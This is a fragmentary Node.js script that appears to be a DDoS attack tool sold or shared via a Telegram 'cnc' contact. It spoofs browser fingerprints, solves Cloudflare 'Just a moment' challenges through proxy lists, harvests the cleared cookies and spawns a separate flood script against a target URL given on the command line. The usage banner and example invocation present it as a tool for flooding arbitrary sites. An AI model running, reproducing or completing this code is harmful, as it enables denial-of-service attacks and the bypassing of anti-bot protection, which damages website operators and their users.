...
async function spoofFingerprint(page) {
	//colored(colors.COLOR_BRIGHT_YELLOW, `[Js/Browser] Spoofing fingerprint for Chrome use`);
...
console.log(`
 ...
 ${chalk.white('Engine :')} ${chalk.green.bold('BROWSER SOLVER CAPTCHA/UAM')} | Updated : ${chalk.magenta.bold('20/12/2025')}
 ${chalk.white('Contact :')} ${chalk.cyanBright.bold('t.me/vladimir_cnc1')}

 ${chalk.redBright('USAGE')}
   node browser.js <target> <time> <browser> <flood> <rate> <proxy>
 ${chalk.yellow('EXAMPLE')}
   node browser.js https://www.target.com 250 5 5 64 proxy.txt
...
async function solvingCaptcha(browser, page, browserProxy) {
    try {
        ...
        if (content.includes("challenge-platform") || content.includes("cloudflare.challenges.com") || title === "Just a moment...") {
            console.log(`[Js/Browser]➝ Start chrome run with addressProxy: ${colors.magenta(`${browserProxy}`)}`);
...
async function RetrySolving(browser, page, browserProxy) {
    try {
        ...
        if (title === "Attention Required! | Cloudflare") {
            await browser.close();
            colored(colors.COLOR_RED, "[Js/Browser] Blocked by Cloudflare. Exiting.");
            return;
        }
        if (content.includes("challenge-platform") || content.includes("cloudflare.challenges.com") || title === "Just a moment...") {
            console.log(`[Js/Browser]➝ Start chrome run with addressProxy: ${colors.magenta(`${browserProxy}`)}`);
    ...
    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
         if (response) {
            ...
            cookieCount++;
            const cookies = `[Js/Browser] Total solve: ${cookieCount} | Title: ${response.title} | Proxy: ${browserProxy} | Cookies: ${response.cookies}`;
            ...
            try {
                ...
                colored(colors.COLOR_RED, "[Js/Browser] Error spawning flood.js: " + error.message);
            }
...
queue.drain(function() {
    colored(colors.COLOR_RED, "[Js/Browser] All proxies processed")
    process.exit(1)
});
...
async function main() {
    ...
    setTimeout(() => {
        ...
        setTimeout(() => {
            colored(colors.COLOR_GREEN, "[Js/Browser] Exiting");
            process.exit(0)
        }, 5000)
    }, duration * 1000)
}
